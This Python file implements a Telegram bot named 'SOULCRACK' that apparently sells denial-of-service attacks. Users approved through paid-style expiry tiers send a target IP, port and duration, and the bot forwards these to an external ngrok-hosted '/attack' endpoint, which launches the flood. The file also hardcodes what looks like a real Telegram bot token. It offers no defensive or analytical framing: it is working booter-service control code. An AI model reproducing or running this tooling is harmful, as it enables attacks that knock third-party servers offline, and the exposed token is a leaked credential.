import os, json, requests, logging, threading
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from flask import Flask
from threading import Thread

# Logging & Flask for Render
logging.basicConfig(level=logging.INFO)
app = Flask('')
@app.route('/')
def home(): return "Bot is Live!"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

# --- CONFIGURATION ---
BOT_TOKEN = "8748437919:AAEI0zQ_-0Umg0wqFAbIvCqF9xjssceudo0"
OWNER_ID = 7529105228
ADMIN_IDS = [7529105228]
users_file = 'users_db.json'

# --- DATABASE LOGIC ---
def load_db():
    if os.path.exists(users_file):
        with open(users_file, 'r') as f: return json.load(f)
    return {"users": {}, "resellers": []}

def save_db(data):
    with open(users_file, 'w') as f: json.dump(data, f, indent=4)

db = load_db()

# --- API TRIGGER ---
def trigger_attack_api(host, port, time):
    api_url = f"https://bubble-sponge-unpicked.ngrok-free.dev/attack?host={host}&port={port}&time={time}"
    try: requests.get(api_url, timeout=5)
    except: pass

# --- KEYBOARDS ---
def get_keyboard(uid):
    buttons = [[KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Status")]]
    if uid == OWNER_ID or str(uid) in db["resellers"]:
        buttons.append([KeyboardButton("➕ Add User"), KeyboardButton("👥 User List")])
    if uid == OWNER_ID:
        buttons.append([KeyboardButton("👑 Owner Panel"), KeyboardButton("⚙️ Settings")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

# --- COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(f"🚀 **SOULCRACK BOT READY**\nOwner: Devendra", reply_markup=get_keyboard(uid))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text
    
    if text == "🎯 Launch Attack":
        if str(uid) not in db["users"] and uid != OWNER_ID:
            await update.message.reply_text("❌ No Access! Contact @Devendra")
            return
        await update.message.reply_text("Send target in format: `IP PORT TIME` (e.g. 1.1.1.1 80 60)")

    elif text == "👥 User List":
        user_list = "\n".join([f"ID: `{k}` (Ends: {v})" for k, v in db["users"].items()])
        await update.message.reply_text(f"👥 **APPROVED USERS:**\n{user_list if user_list else 'No users'}")

    elif len(text.split()) == 3: # Attack Input
        parts = text.split()
        trigger_attack_api(parts[0], parts[1], parts[2])
        await update.message.reply_text(f"🚀 **ATTACK SENT!**\nTarget: {parts[0]}:{parts[1]}\nTime: {parts[2]}s")

# --- ADMIN COMMANDS ---
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    try:
        args = context.args
        target_id, days = args[0], int(args[1])
        expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')
        db["users"][target_id] = expiry
        save_db(db)
        await update.message.reply_text(f"✅ User {target_id} added for {days} days.")
    except:
        await update.message.reply_text("Use: `/add ID DAYS`")

def main():
    keep_alive()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling()

if __name__ == '__main__':
    main()
